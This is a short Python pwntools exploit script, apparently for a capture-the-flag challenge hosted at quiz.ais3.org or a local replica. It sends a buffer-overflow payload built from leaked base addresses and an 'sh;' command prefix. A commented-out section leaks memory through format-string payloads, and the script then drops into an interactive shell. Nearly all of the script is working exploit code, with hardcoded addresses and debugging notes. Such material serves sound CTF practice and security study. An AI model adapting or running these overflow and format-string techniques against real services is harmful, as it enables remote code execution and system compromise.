#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *

#

host , port = 'quiz.ais3.org' , 4869
host , port = '192.168.78.247' , 7777
y = remote(host,port)


def bof( p ):
    y.sendafter( 'ice:' , '2\n' )
    y.sendafter( ':' , p )

def eco( p ):
    y.sendafter( 'ice:' , '1\n' )
    y.send( p )


remote_leak = 0x7FF775DA11B3
offset      = 0x11b3
remote_base = 0x7ff775da0000

loco_leak   = 0x7FF75F9511B3
offset      = 0x11b3
loco_base   = 0x7ff75f950000

ch_base     = 0x7ff711afb000
ch_echo     = 0x7ff711afbde0

ppr = 0x4599

system = 0x140004628

p = 'sh;DDDDD' + 'a' * ( 0x18 ) + p64( remote_base + 0x1051 ) + p64( 0x2 ) + p64( remote_base + 0x11bc )
#p = p64( remote_base + 0x11bc ) * 6
#p = 'a' * ( 3  )
#p = p64( 0x140001080 ) * 6

#print p

#bof( p )
                                                   #7FF775DBE098
# 75dbe098 7d1edeb8 7d1ef4b178 2578257825 78250 00007FF775DA11B3
# 7FF775DBE098
# 7FF775DBE098 7E9946E168
#              548F4DDA58

maigic = 0x7ffe34eed478
loco_magic = 0x7ffef99b3cf6


bye = 0x11bc

'''
eco( 'yuawn\n' )

y.recvline()
o = y.recvline()
o = o[:o.find('**')]
l = u64( o[:-1].ljust( 8 , '\x00' ) )

log.info( o )
log.success( hex( l ) )

# %p%p%p%p

fmt = '%p' * 1 + '%p' * 4 + 'QQ%s\na' + p64( l ) + 'AAAA'
eco( fmt )
y.recvuntil( 'QQ' )
o = y.recv(1024)
data = u64( o.ljust( 8 , '\x00' ) )
log.success( '{} | {}'.format( hex( data ) , o ) )
'''




y.interactive()